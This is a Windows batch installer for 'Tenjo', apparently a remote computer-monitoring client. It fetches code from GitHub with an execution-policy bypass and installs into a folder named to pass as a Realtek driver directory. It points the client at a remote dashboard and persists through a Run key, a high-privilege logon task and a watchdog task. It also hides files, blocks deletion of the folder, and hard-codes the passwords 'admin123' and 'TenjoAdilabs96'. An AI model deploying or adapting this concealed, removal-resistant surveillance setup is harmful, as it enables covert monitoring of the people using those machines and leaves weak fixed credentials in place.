@echo off
setlocal enabledelayedexpansion

REM Tenjo Remote Installer for Windows
REM One-liner: curl -L -o install.bat https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/install_windows.bat && install.bat

echo ========================================
echo    TENJO - REMOTE INSTALLER v1.0.5
echo    With Password + Folder Protection
echo ========================================
echo.

REM Check Admin
net session >nul 2>&1
if errorlevel 1 (
    echo [ERROR] Administrator privileges required!
    echo Right-click and select "Run as administrator"
    pause
    exit /b 1
)

REM Check Python
python --version >nul 2>&1
if errorlevel 1 (
    echo [!] Python not found! Installing Python 3.10...
    echo.
    
    REM Download Python installer
    echo [1/3] Downloading Python 3.10.11...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe' -OutFile '%TEMP%\python_installer.exe'"
    if errorlevel 1 (
        echo [ERROR] Download failed!
        echo Please install Python manually from python.org
        pause
        exit /b 1
    )
    
    REM Install Python silently
    echo [2/3] Installing Python (this may take 2-3 minutes)...
    "%TEMP%\python_installer.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    if errorlevel 1 (
        echo [ERROR] Python installation failed!
        pause
        exit /b 1
    )
    
    REM Refresh PATH
    echo [3/3] Refreshing environment...
    setx PATH "%PATH%;C:\Program Files\Python310;C:\Program Files\Python310\Scripts" /M >nul 2>&1
    set "PATH=%PATH%;C:\Program Files\Python310;C:\Program Files\Python310\Scripts"
    timeout /t 3 /nobreak >nul
    
    REM Cleanup
    del "%TEMP%\python_installer.exe" >nul 2>&1
    
    REM Verify installation
    python --version >nul 2>&1
    if errorlevel 1 (
        echo [ERROR] Python installed but not accessible
        echo Please restart CMD and run installer again
        pause
        exit /b 1
    )
    echo [OK] Python 3.10 installed successfully!
    echo.
)

REM Check Python version
for /f "tokens=2" %%i in ('python --version 2^>^&1') do set "PYVER=%%i"
for /f "tokens=1,2 delims=." %%a in ("!PYVER!") do (
    set "PYMAJOR=%%a"
    set "PYMINOR=%%b"
)
if !PYMAJOR! LSS 3 (
    echo [ERROR] Python !PYVER! too old! Need 3.10+
    pause
    exit /b 1
)
if !PYMAJOR! EQU 3 if !PYMINOR! LSS 10 (
    echo [ERROR] Python !PYVER! too old! Need 3.10+
    pause
    exit /b 1
)
echo [OK] Python !PYVER! detected

REM Installation directory
set "TENJO_DIR=C:\ProgramData\Realtek 786"
echo [INFO] Installing to: %TENJO_DIR%
echo.

REM Create directory
if not exist "%TENJO_DIR%" mkdir "%TENJO_DIR%"

REM Download ZIP from GitHub
echo [1/5] Downloading from GitHub...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/Adi-Sumardi/Tenjo/archive/refs/heads/master.zip' -OutFile '%TEMP%\tenjo.zip'"
if errorlevel 1 (
    echo [ERROR] Download failed!
    pause
    exit /b 1
)
echo [OK] Downloaded

REM Extract
echo [2/5] Extracting files...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%TEMP%\tenjo.zip' -DestinationPath '%TEMP%\tenjo_extracted' -Force"
if errorlevel 1 (
    echo [ERROR] Extraction failed!
    pause
    exit /b 1
)

REM Copy client files
xcopy /E /I /Y "%TEMP%\tenjo_extracted\Tenjo-master\client\*" "%TENJO_DIR%\" >nul
echo [OK] Files extracted

REM Install dependencies
echo [3/5] Installing Python packages...
cd /d "%TENJO_DIR%"
python -m pip install --upgrade pip >nul 2>&1
python -m pip install -r requirements.txt >nul 2>&1
if errorlevel 1 (
    echo [WARNING] Some packages may have failed
)
echo [OK] Dependencies installed

REM Create config override
echo [4/5] Configuring...
echo {"server_url": "https://tenjo.adilabs.id"} > "%TENJO_DIR%\server_override.json"

REM Create batch wrapper
(
echo @echo off
echo cd /d "C:\ProgramData\Realtek 786"
echo python.exe main.py
) > "%TENJO_DIR%\start_tenjo.bat"

REM Registry autostart
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TenjoMonitor" /t REG_SZ /d "\"%TENJO_DIR%\start_tenjo.bat\"" /f >nul 2>&1

REM Scheduled task for main client
set "TASK_XML=%TEMP%\tenjo_task.xml"
(
echo ^<?xml version="1.0" encoding="UTF-16"?^>
echo ^<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
echo   ^<Triggers^>^<LogonTrigger^>^<Enabled^>true^</Enabled^>^</LogonTrigger^>^</Triggers^>
echo   ^<Principals^>^<Principal^>^<LogonType^>InteractiveToken^</LogonType^>^<RunLevel^>HighestAvailable^</RunLevel^>^</Principal^>^</Principals^>
echo   ^<Settings^>^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^>^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>^</Settings^>
echo   ^<Actions^>^<Exec^>^<Command^>"%TENJO_DIR%\start_tenjo.bat"^</Command^>^</Exec^>^</Actions^>
echo ^</Task^>
) > "%TASK_XML%"

schtasks /Create /TN "TenjoMonitor" /XML "%TASK_XML%" /F >nul 2>&1
del "%TASK_XML%" >nul 2>&1

REM Scheduled task for watchdog (monitors main client)
set "WATCHDOG_XML=%TEMP%\tenjo_watchdog.xml"
(
echo ^<?xml version="1.0" encoding="UTF-16"?^>
echo ^<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
echo   ^<Triggers^>^<LogonTrigger^>^<Enabled^>true^</Enabled^>^</LogonTrigger^>^</Triggers^>
echo   ^<Principals^>^<Principal^>^<LogonType^>InteractiveToken^</LogonType^>^<RunLevel^>HighestAvailable^</RunLevel^>^</Principal^>^</Principals^>
echo   ^<Settings^>^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^>^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>^</Settings^>
echo   ^<Actions^>^<Exec^>^<Command^>python.exe^</Command^>^<Arguments^>watchdog.py^</Arguments^>^<WorkingDirectory^>%TENJO_DIR%^</WorkingDirectory^>^</Exec^>^</Actions^>
echo ^</Task^>
) > "%WATCHDOG_XML%"

schtasks /Create /TN "TenjoWatchdog" /XML "%WATCHDOG_XML%" /F >nul 2>&1
del "%WATCHDOG_XML%" >nul 2>&1
echo [OK] Service configured (with watchdog)

REM Set password protection
echo.
echo [5/6] Setting up password protection...
set "DEFAULT_PASSWORD=admin123"

echo.
echo Password default: admin123
set /p "USE_CUSTOM=Gunakan password custom? (Y/N, default: N): "

if /i "!USE_CUSTOM!"=="Y" (
    set /p "CUSTOM_PASS=Masukkan password baru (min 6 karakter): "
    if not "!CUSTOM_PASS!"=="" (
        set "DEFAULT_PASSWORD=!CUSTOM_PASS!"
        echo [OK] Password custom diset
    ) else (
        echo [!] Password kosong, menggunakan default
    )
)

REM Set password using Python module
python "%TENJO_DIR%\src\utils\password_protection.py" set "!DEFAULT_PASSWORD!" >nul 2>&1
echo [OK] Password protection aktif
echo.
echo PENTING: Simpan password ini untuk uninstall client!
echo Password: !DEFAULT_PASSWORD!
echo.
timeout /t 2 /nobreak >nul

REM Apply folder protection
echo [6/7] Protecting folder...
set "MASTER_PASSWORD=TenjoAdilabs96"

REM Check if folder_protection.py exists
if exist "%TENJO_DIR%\src\utils\folder_protection.py" (
    python "%TENJO_DIR%\src\utils\folder_protection.py" protect "!MASTER_PASSWORD!" >nul 2>&1
    if !errorlevel! equ 0 (
        echo [OK] Folder protection aktif
        echo   - Folder tidak bisa dihapus paksa
        echo   - File critical di-hidden
    ) else (
        echo [!] WARNING: Folder protection gagal
        echo   Installer akan lanjut tanpa folder protection
    )
) else (
    echo [!] WARNING: folder_protection.py tidak ditemukan
    echo   Installer akan lanjut tanpa folder protection
)

REM Start service
echo [7/7] Starting service...
start "" "%TENJO_DIR%\start_tenjo.bat"
timeout /t 2 /nobreak >nul
echo [OK] Service started

REM Cleanup
del "%TEMP%\tenjo.zip" >nul 2>&1
rmdir /S /Q "%TEMP%\tenjo_extracted" >nul 2>&1

echo.
echo ========================================
echo    INSTALLATION COMPLETE!
echo ========================================
echo.
echo Client installed to: %TENJO_DIR%
echo Dashboard: https://tenjo.adilabs.id
echo.
echo Client should appear in dashboard within 2 minutes
echo.
pause
